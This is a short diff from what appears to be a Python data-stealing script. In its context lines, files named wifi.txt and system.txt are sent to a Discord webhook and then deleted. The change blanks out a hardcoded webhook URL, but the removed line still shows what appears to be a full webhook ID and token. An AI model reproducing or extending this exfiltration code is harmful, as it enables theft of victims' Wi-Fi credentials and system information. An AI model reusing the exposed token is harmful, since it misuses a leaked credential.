@@ -79,7 +79,7 @@ delete_files(["wifi.txt", "system.txt"]) #delete_files(["wifi.txt", "system.txt"
 
 def send(url, files, text):
     try:
-        webhook = SyncWebhook.from_url(url)#"https://discord.com/api/webhooks/1100106371451596821/67i4xd-mbGA0U1_krCys3hviIVmpw0eUqCplQVBaZHYbKw-sE9TovNbBvCYV_8ULyK1l"
+        webhook = SyncWebhook.from_url(url)#"https://discord.com/api/webhooks/"
     except:
         return
 
